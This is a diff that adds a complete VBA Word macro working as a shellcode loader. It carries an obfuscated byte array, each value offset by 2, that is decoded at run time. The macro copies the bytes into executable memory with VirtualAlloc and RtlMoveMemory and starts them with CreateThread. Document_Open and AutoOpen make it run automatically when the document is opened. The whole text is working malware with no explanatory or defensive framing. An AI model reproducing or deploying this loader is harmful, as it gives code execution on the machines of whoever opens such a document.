@@ -1,0 +1,44 @@
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function s()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As Long
+    buf = Array(254, 235, 136, 2, 2, 2, 95, 133, 199, 13, 131, 198, 114, 0, 1, 1, 143, 86, 38, 98, 84, 106, 179, 76, 109, 179, 1, 215, 143, 70, 38, 98, 237, 94, 96, 143, 122, 98, 89, 82, 51, 221, 85, 85, 106, 6, 2, 2, 10, 85, _
+85, 85, 88, 85, 106, 123, 206, 65, 136, 1, 215, 135, 194, 118, 87, 108, 66, 130, 201, 18, 85, 85, 51, 221, 85, 1, 57, 106, 176, 137, 148, 65, 1, 215, 86, 106, 70, 3, 2, 2, 237, 55, 82, 1, 57, 106, 199, 218, 191, 233, _
+1, 215, 85, 85, 85, 141, 78, 38, 254, 83, 85, 85, 1, 57, 106, 200, 174, 156, 123, 1, 215, 235, 63, 3, 2, 2, 234, 161, 1, 1, 1, 116, 119, 112, 102, 110, 110, 53, 52, 2, 234, 119, 1, 1, 1, 234, 200, 1, 1, 1, _
+254, 234, 132, 2, 2, 2, 98, 139, 231, 51, 194, 102, 141, 82, 50, 141, 84, 14, 141, 84, 22, 141, 116, 42, 17, 185, 76, 40, 51, 1, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 228, 244, 84, 89, 141, 84, 18, 141, _
+76, 62, 141, 78, 19, 122, 229, 74, 3, 211, 83, 141, 91, 34, 3, 213, 141, 75, 26, 229, 60, 75, 141, 54, 141, 3, 216, 51, 1, 174, 195, 209, 15, 3, 201, 58, 226, 119, 248, 5, 127, 250, 61, 127, 38, 119, 230, 90, 141, 90, _
+38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 97, 97, 92, 141, 20, 237, 143, 95, 106, 53, 52, 2, 2, 106, 121, 117, 52, 97, 86, 106, 78, _
+121, 40, 9, 1, 215, 186, 146, 3, 2, 2, 43, 198, 86, 82, 106, 43, 130, 109, 2, 1, 215, 82, 82, 82, 82, 66, 82, 66, 82, 106, 236, 17, 225, 226, 1, 215, 153, 108, 7, 106, 194, 170, 47, 248, 106, 4, 2, 3, 189, 139, _
+232, 108, 18, 88, 89, 106, 155, 167, 118, 99, 1, 215, 135, 194, 118, 14, 1, 80, 10, 119, 238, 106, 242, 183, 164, 88, 1, 215, 106, 101, 111, 102, 2, 139, 229, 89, 89, 89, 51, 248, 108, 20, 91, 88, 228, 255, 104, 201, 70, 38, _
+62, 3, 3, 143, 70, 38, 18, 200, 2, 70, 86, 82, 88, 88, 88, 72, 88, 80, 88, 88, 85, 88, 106, 123, 206, 65, 136, 1, 215, 139, 226, 80, 88, 72, 1, 50, 106, 10, 137, 31, 98, 1, 215, 189, 226, 31, 44, 12, 106, 168, _
+151, 191, 159, 1, 215, 62, 8, 126, 12, 130, 253, 226, 119, 7, 189, 73, 21, 116, 113, 108, 2, 85, 1, 215)
+
+    For i = 0 To UBound(buf)
+        buf(i) = buf(i) - 2
+    Next i
+    
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
+
+Sub Document_Open()
+    s
+End Sub
+
+Sub AutoOpen()
+    s
+End Sub
+
+
